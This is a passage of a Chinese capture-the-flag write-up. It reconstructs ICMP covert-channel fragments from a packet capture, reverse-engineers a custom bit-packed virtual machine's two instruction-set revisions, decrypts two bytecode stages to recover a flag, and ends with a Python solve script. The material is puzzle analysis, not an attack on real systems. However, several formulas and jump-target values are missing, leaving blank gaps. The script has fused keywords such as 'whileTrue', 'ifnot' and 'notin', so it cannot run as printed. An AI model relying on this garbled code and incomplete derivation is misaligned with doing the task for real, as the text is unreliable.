| `10/12` | Pkt 41 (`doc10.darknet-corp.net` TXT) | `10/12 :: 16 regs R0-RF, mod 256, 256-deep stack. pop on empty faults.` |
| `11/12` | Pkt 14 (`/kv-vm-manual.txt` HTTP 响应头) | `11/12 :: pages lie. cats lie. chaff channels lie. trust checksums.` |
| `12/12` | Pkt 43 (`doc12.darknet-corp.net` TXT) | `12/12 :: if your disassembly turns to garbage, congratulations. keep going.` |

同时，Pkt 14 正文给出了旧版固件 v2.4 的指令助记符列表（ `/kv-vm-manual.txt` ）：

```powershell
KV-VM REFERENCE MANUAL -- firmware v2.4
=======================================
16 registers R0-RF, mod 256. operands follow the opcode byte.

0x00 HALT        0x2C LOADI r,imm   0x4A MOVR rd,rs    0xB4 LOADC rD,[rA]
0x58 STOREC [rA],rV  0x37 PUSH r    0x91 POP r         0x61 EMIT r
0x83 ADDI r,imm  0x6E SUBI r,imm    0x0F XORI r,imm    0xA2 ANDI r,imm
0x1D ROLI r,imm  0xC9 XORR rd,rs    0x53 ADDR rd,rs    0xD7 JMP a16le
0x19 JNZ r,a16le 0xEB JZ r,a16le
```

加上笔记 `8/12` 提到的 `JMPR r` ，固件 v3 共有 19 条指令，操作码由 8-bit 改为 5-bit，按 MSB-first 紧凑比特流排列（无字节对齐）。

### 3.3 逆向 KV-VM v3 指令集（rev.B 与 rev.C）

**关键观察：** 在 TCP 流量中存在两个测试会话：

-   `10.0.0.5:52300 <-> 10.0.0.99:31337` ：发送了 21 条 `RUN <hex>` 测试指令，覆盖全部 `rev.B` 指令。
    
-   `10.0.0.5:52400 <-> 10.0.0.99:31338` ：服务端首先返回 Banner：
    
    ```
    rev.C test box. 3 opcodes redefined vs rev.B. no manual. RUN <hex>
    ```
    
    随后客户端发送了 9 条测试指令。
    

**原理与操作：** 将 `31337` 会话中的十六进制指令转为 MSB-first 二进制比特流。以第一条测试 `RUN 3820c83e` `OUT 41` （共 32 bits）为例：

```
00111 0000 01000001 | 10010 0000 | 11111 | 0 (padding)
LOADI R0,  0x41     | EMIT  R0   | HALT  |
```

由此直接确定 `00111` 为 `LOADI r, imm` （）、 `10010` 为 `EMIT r` （）、 `11111` 为 `HALT` （）。同理逐一拆解其余 20 条 `31337` 测试用例，再对比 `31338` （ `rev.C` ）的 9 条测试用例：

1.  在 `31338` 中， `RUN 3840e000641f` （ `LOADI R0, 0x81; 11000 R0, 0x01; EMIT R0; HALT` ）输出 `OUT c0` ， `RUN 3810e000a41f` （ `LOADI R0, 0x21; 11000 R0, 0x02; EMIT R0; HALT` ）输出 `OUT 48` 。可見 `11000` 在 `rev.B` 中为循环左移 `ROLI` ，而在 `rev.C` 中重定义为\*\*循环右移 `RORI` \*\*。
    
2.  在 `31338` 中， `RUN b0483e` （ `POP R0; EMIT R0; HALT` ）输出 `OUT 00` ，而在 `31337` 中 `RUN b07c` 返回 `ERR stack underflow (POP on empty)` 。可见 `10110` （ `POP` ）在 `rev.C` 中\*\*空栈弹出时不再报错，而是返回 `0` \*\*。
    
3.  在 `31338` 中， `RUN 3b8121c038abc87e` （ `LOADI R7, 0x02; JMPR R7` 后在 bit 32 处存放 `LOADI R0, 0x57; EMIT R0; HALT` ）输出 `OUT 57` ； `LOADI R7, 0x03; JMPR R7` 跳转到 bit 48 输出 `OUT 59` 。可见 `01000` （ `JMPR r` ）在 `rev.B` 中跳转目标为 ，而在 `rev.C` 中重定义为 \*\*\*\*。
    

**本步结果：** 完整还原的 KV-VM v3 指令集如下表所示：

| 5-bit Opcode | 助记符 | 格式与比特长度 | `rev.B`<br><br>语义 | `rev.C`<br><br>差异 |
| --- | --- | --- | --- | --- |
| `00001`<br><br>(`0x01`) | `STOREC [rA], rV` | `op(5) + rA(4) + rV(4)`<br><br>\= 13b | `mem[R[rA]] = R[rV]` | 相同  |
| `00011`<br><br>(`0x03`) | `ADDI r, imm` | `op(5) + r(4) + imm(8)`<br><br>\= 17b | `R[r] = (R[r] + imm) & 0xFF` | 相同  |
| `00110`<br><br>(`0x06`) | `ADDR rd, rs` | `op(5) + rd(4) + rs(4)`<br><br>\= 13b | `R[rd] = (R[rd] + R[rs]) & 0xFF` | 相同  |
| `00111`<br><br>(`0x07`) | `LOADI r, imm` | `op(5) + r(4) + imm(8)`<br><br>\= 17b | `R[r] = imm` | 相同  |
| `01000`<br><br>(`0x08`) | `JMPR r` | `op(5) + r(4)`<br><br>\= 9b | `pc = R[r] * 8` | **`pc = R[r] * 16`** |
| `01001`<br><br>(`0x09`) | `MOVR rd, rs` | `op(5) + rd(4) + rs(4)`<br><br>\= 13b | `R[rd] = R[rs]` | 相同  |
| `01010`<br><br>(`0x0A`) | `JMP a16` | `op(5) + addr(16)`<br><br>\= 21b | `pc = addr` | 相同  |
| `01011`<br><br>(`0x0B`) | `XORI r, imm` | `op(5) + r(4) + imm(8)`<br><br>\= 17b | `R[r] ^= imm` | 相同  |
| `01101`<br><br>(`0x0D`) | `PUSH r` | `op(5) + r(4)`<br><br>\= 9b | `stack.push(R[r])` | 相同  |
| `01110`<br><br>(`0x0E`) | `ANDI r, imm` | `op(5) + r(4) + imm(8)`<br><br>\= 17b | `R[r] &= imm` | 相同  |
| `10000`<br><br>(`0x10`) | `JZ r, a16` | `op(5) + r(4) + addr(16)`<br><br>\= 25b | 若 `R[r] == 0` 则 `pc = addr` | 相同  |
| `10001`<br><br>(`0x11`) | `XORR rd, rs` | `op(5) + rd(4) + rs(4)`<br><br>\= 13b | `R[rd] ^= R[rs]` | 相同  |
| `10010`<br><br>(`0x12`) | `EMIT r` | `op(5) + r(4)`<br><br>\= 9b | 输出字节 `R[r]` | 相同  |
| `10100`<br><br>(`0x14`) | `LOADC rD, [rA]` | `op(5) + rD(4) + rA(4)`<br><br>\= 13b | `R[rD] = mem[R[rA]]` | 相同  |
| `10101`<br><br>(`0x15`) | `SUBI r, imm` | `op(5) + r(4) + imm(8)`<br><br>\= 17b | `R[r] = (R[r] - imm) & 0xFF` | 相同  |
| `10110`<br><br>(`0x16`) | `POP r` | `op(5) + r(4)`<br><br>\= 9b | 空栈报错，否则 `R[r] = stack.pop()` | **空栈时 `R[r] = 0`** |
| `11000`<br><br>(`0x18`) | `ROLI`<br><br>/ `RORI` | `op(5) + r(4) + imm(8)`<br><br>\= 17b | 循环左移 `imm & 7` 位 | **循环右移 `imm & 7` 位** |
| `11100`<br><br>(`0x1C`) | `JNZ r, a16` | `op(5) + r(4) + addr(16)`<br><br>\= 25b | 若 `R[r] != 0` 则 `pc = addr` | 相同  |
| `11111`<br><br>(`0x1F`) | `HALT` | `op(5)`<br><br>\= 5b | 停机  | 相同  |

### 3.4 解密并执行第一阶段 KV 通道字节码（rev.B）

**关键观察：** ICMP 流量中共包含 39 个以 `KV` 开头的 Echo Request 数据包（Pkt 209 至 Pkt 285）。根据笔记 `2/12` ~ `5/12` ，其格式为 `'KV' | u8 seq | u8 len | u8 cksum | data` ，使用初始密钥 ，递推公式为：

第 `seq` 号分片中第 字节的解密公式为：

**原理与操作：** 对 39 个 `KV` 分片执行解密并验证 。其中来自 `10.0.0.13` 的 3 个伪造包（Pkt 213、227、243）校验和失败被自动丢弃，来自 `10.0.0.5` 的 36 个包全部通过校验（包含 4 个重传包），去重并按 `seq = 0..31` 升序拼接，得到 251 字节的 `rev.B` 固件字节码。

将该 251 字节送入 `rev.B` 虚拟机运行：

1.  第一阶段循环（ `pc = 0..447` ）原地解密偏移 `59..178` （ `0x3b..0xb2` ）的代码（这解释了笔记 `12/12` 中“反汇编变成乱码说明找对了方向”的自修改特性）。
    
2.  第二阶段（ `pc = 552..747` ）计算前 59 字节的校验和并与 `0x16` 异或比对，防止字节码被篡改（若被篡改则跳转到 `pc = 1088` 输出假 Flag `flag{fake_patched_s0rry}` ）。
    
3.  第三阶段（ `pc = 768..1029` ）解密偏移 `179..250` （ `0xb3..0xfa` ）的区域并跳转至 `0xb3 * 8 = 1432` 。
    
4.  第四阶段（ `pc = 1432..1671` ）将偏移 `0xd2..0xfa` 的 41 字节数据循环左移 3 位、异或 `0x5a` 及地址偏移后压栈再逆序弹出输出。
    

**本步结果：** `rev.B` 虚拟机运行 3319 步后在 `pc = 1671` 处正常停机，输出 41 字节明文：

```
flag{tw0_c4t
PX rev.C k=9f3cb712aa55d04e
```

输出给出了前半段 Flag `flag{tw0_c4t` ，并指出下一阶段位于 ICMP 的 `PX` 通道，需使用密钥 `k = 9f3cb712aa55d04e` 解密并在 `rev.C` 虚拟机中运行。

### 3.5 解密并执行第二阶段 PX 通道字节码（rev.C）

**关键观察：** 在 ICMP 流量前段（Pkt 117、119、121、123、125）存在 5 个以 `PX` 开头的 Echo Request 数据包（由 `10.0.0.14` 和 `10.0.0.5` 交替发送，对应前半段 Flag 中的 `tw0_c4ts` ）：

```bash
pkt=117 src=10.0.0.14 seq=0 len=10 cksum=0x50 enc=2d2087dc8b32f1bd270e
pkt=119 src=10.0.0.5  seq=1 len=10 cksum=0x30 enc=ab120bc19c6cf61f7713
pkt=121 src=10.0.0.5  seq=2 len=10 cksum=0x0e enc=0650160eaa2ca91aa952
pkt=123 src=10.0.0.14 seq=3 len=10 cksum=0x37 enc=10feaff6916921ac04b9
pkt=125 src=10.0.0.5  seq=4 len=2  cksum=0x3b enc=80bb
```

**原理与操作：** 将 `PX` 的 5 个分片按 `seq = 0..4` 顺序拼接得到 42 字节密文 `enc_all` ，使用第一阶段获得的 8 字节密钥 `k = bytes.fromhex("9f3cb712aa55d04e")` 进行循环异或解密：

解密得到 42 字节的 `rev.C` 字节码：

```
b21c30ce216721f3b8321c00a1944c226923c001ac05c64035101e080307c0b030ca267b8bf9d4f71f87
```

其首指令为 `b2...`（ `10110 0100` ，即 `POP R4` ，依赖 `rev.C` 空栈弹出返回 `0` 的特性），并结合 `JMPR` （乘 16）与 `RORI` （循环右移）解密内置数据后逐字节 `EMIT` 。

**本步结果：** 送入 `rev.C` 虚拟机运行 106 步后在 `pc = 237` 停机，输出后半段 Flag：

```
s_0ne_tr4p}
```

将两阶段输出拼接，即得最终完整 Flag `flag{tw0_c4ts_0ne_tr4p}` 。

## 4\. 完整解题脚本

将以下脚本保存为 `solve.py` ，放置在与 `capture.pcap` 同一目录下（或通过命令行参数传入 `capture.pcap` 路径）即可直接运行：

```python
import struct
import sys

def parse_and_repair_pcap(path):
    with open(path, "rb") as f:
        data = f.read()

    offset = 24
    packets = []
    while offset + 16 <= len(data):
        ts_sec, ts_usec, incl_len, orig_len = struct.unpack("<IIII", data[offset:offset+16])
        pkt_start = offset + 16
        eth_type = struct.unpack(">H", data[pkt_start+12:pkt_start+14])[0]
        # 根据二层协议与 IPv4 Total Length 计算真实帧长，绕过损坏的 incl_len
        if eth_type == 0x0800:
            ip_len = struct.unpack(">H", data[pkt_start+16:pkt_start+18])[0]
            real_len = 14 + ip_len
        elif eth_type == 0x0806:
            real_len = 42
        else:
            real_len = incl_len
        packets.append(data[pkt_start:pkt_start+real_len])
        offset = pkt_start + real_len
    return packets

def run_kv_vm(code_bytes, rev="B"):
    mem = bytearray(code_bytes) + bytearray(256)
    regs = [0] * 16
    stack = []
    out = bytearray()
    pc = 0

    def get_bits(pos, n):
        val = 0
        for i in range(n):
            val = (val << 1) | ((mem[(pos + i) >> 3] >> (7 - ((pos + i) & 7))) & 1)
        return val

    whileTrue:
        op = get_bits(pc, 5)
        if op == 0b11111:  # HALT
            break
        elif op == 0b00111:  # LOADI r, imm
            regs[get_bits(pc + 5, 4)] = get_bits(pc + 9, 8)
            pc += 17
        elif op == 0b10010:  # EMIT r
            out.append(regs[get_bits(pc + 5, 4)])
            pc += 9
        elif op == 0b00011:  # ADDI r, imm
            r = get_bits(pc + 5, 4)
            regs[r] = (regs[r] + get_bits(pc + 9, 8)) & 0xFF
            pc += 17
        elif op == 0b10101:  # SUBI r, imm
            r = get_bits(pc + 5, 4)
            regs[r] = (regs[r] - get_bits(pc + 9, 8)) & 0xFF
            pc += 17
        elif op == 0b01011:  # XORI r, imm
            r = get_bits(pc + 5, 4)
            regs[r] = (regs[r] ^ get_bits(pc + 9, 8)) & 0xFF
            pc += 17
        elif op == 0b01110:  # ANDI r, imm
            r = get_bits(pc + 5, 4)
            regs[r] = (regs[r] & get_bits(pc + 9, 8)) & 0xFF
            pc += 17
        elif op == 0b11000:  # ROLI (rev.B) / RORI (rev.C)
            r = get_bits(pc + 5, 4)
            imm = get_bits(pc + 9, 8) & 7
            v = regs[r]
            if rev == "B":
                regs[r] = ((v << imm) | (v >> (8 - imm))) & 0xFF
            else:
                regs[r] = ((v >> imm) | (v << (8 - imm))) & 0xFF
            pc += 17
        elif op == 0b01001:  # MOVR rd, rs
            regs[get_bits(pc + 5, 4)] = regs[get_bits(pc + 9, 4)]
            pc += 13
        elif op == 0b10001:  # XORR rd, rs
            rd = get_bits(pc + 5, 4)
            regs[rd] ^= regs[get_bits(pc + 9, 4)]
            pc += 13
        elif op == 0b00110:  # ADDR rd, rs
            rd = get_bits(pc + 5, 4)
            regs[rd] = (regs[rd] + regs[get_bits(pc + 9, 4)]) & 0xFF
            pc += 13
        elif op == 0b01101:  # PUSH r
            stack.append(regs[get_bits(pc + 5, 4)])
            pc += 9
        elif op == 0b10110:  # POP r
            r = get_bits(pc + 5, 4)
            ifnot stack:
                if rev == "B":
                    raise RuntimeError("Stack underflow")
                regs[r] = 0
            else:
                regs[r] = stack.pop()
            pc += 9
        elif op == 0b00001:  # STOREC [rA], rV
            mem[regs[get_bits(pc + 5, 4)]] = regs[get_bits(pc + 9, 4)]
            pc += 13
        elif op == 0b10100:  # LOADC rD, [rA]
            regs[get_bits(pc + 5, 4)] = mem[regs[get_bits(pc + 9, 4)]]
            pc += 13
        elif op == 0b01010:  # JMP addr16
            pc = get_bits(pc + 5, 16)
        elif op == 0b11100:  # JNZ r, addr16
            r = get_bits(pc + 5, 4)
            a = get_bits(pc + 9, 16)
            pc = a if regs[r] != 0else pc + 25
        elif op == 0b10000:  # JZ r, addr16
            r = get_bits(pc + 5, 4)
            a = get_bits(pc + 9, 16)
            pc = a if regs[r] == 0else pc + 25
        elif op == 0b01000:  # JMPR r
            pc = regs[get_bits(pc + 5, 4)] * (8if rev == "B"else16)
        else:
            raise RuntimeError(f"Unknown opcode {op:05b} at pc={pc}")

    return bytes(out)

def main():
    pcap_path = sys.argv[1] if len(sys.argv) > 1else"capture.pcap"
    packets = parse_and_repair_pcap(pcap_path)
    print(f"[*] Parsed {len(packets)} packets from {pcap_path}")

    # 1. 提取 KV 与 PX 两个 ICMP Echo Request 通道载荷
    kv_pkts = []
    px_pkts = []
    for pkt in packets:
        if struct.unpack(">H", pkt[12:14])[0] == 0x0800and pkt[23] == 1:
            ihl = (pkt[14] & 0x0F) * 4
            icmp = pkt[14 + ihl:]
            if icmp[0] == 8:  # Echo Request
                payload = icmp[8:]
                if payload.startswith(b"KV"):
                    seq, length, cksum = payload[2], payload[3], payload[4]
                    kv_pkts.append((seq, length, cksum, payload[5:5+length]))
                elif payload.startswith(b"PX"):
                    seq = int.from_bytes(payload[2:4], "big")
                    length, cksum = payload[4], payload[5]
                    px_pkts.append((seq, length, cksum, payload[6:6+length]))

    # 2. 解密并重组 KV 通道 (K_0 = 0xA5)
    K = [0xA5]
    for _ in range(256):
        K.append((K[-1] * 31 + 7) & 0xFF)

    kv_by_seq = {}
    for seq, length, cksum, enc in kv_pkts:
        plain = bytes(enc[i] ^ ((K[seq] + i) & 0xFF) for i in range(length))
        if (sum(plain) & 0xFF) == cksum and seq notin kv_by_seq:
            kv_by_seq[seq] = plain

    kv_rom = b"".join(kv_by_seq[s] for s in sorted(kv_by_seq))
    print(f"[*] Reassembled KV bytecode: {len(kv_rom)} bytes (seqs 0..{max(kv_by_seq)})")

    kv_out = run_kv_vm(kv_rom, rev="B").decode()
    print("[*] Stage 1 (KV rev.B) output:")
    print(kv_out.strip())

    lines = kv_out.strip().splitlines()
    flag_part1 = lines[0]
    px_key = bytes.fromhex(lines[1].split("k=")[1])

    # 3. 使用第一阶段输出的密钥解密 PX 通道并在 rev.C 虚拟机上执行
    px_enc = b"".join(enc for _, _, _, enc in sorted(px_pkts, key=lambda x: x[0]))
    px_rom = bytes(px_enc[i] ^ px_key[i % len(px_key)] for i in range(len(px_enc)))
    print(f"[*] Reassembled PX bytecode: {len(px_rom)} bytes")

    flag_part2 = run_kv_vm(px_rom, rev="C").decode()
    print("[*] Stage 2 (PX rev.C) output:")
    print(flag_part2)

    print(f"\n[+] Flag: {flag_part1}{flag_part2}")

if __name__ == "__main__":
    main()
```

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/b03a6d7b51649b07.png)

第九届“强网”拟态防御国际精英挑战赛预选赛 · 目录

作者提示: 个人观点，仅供参考
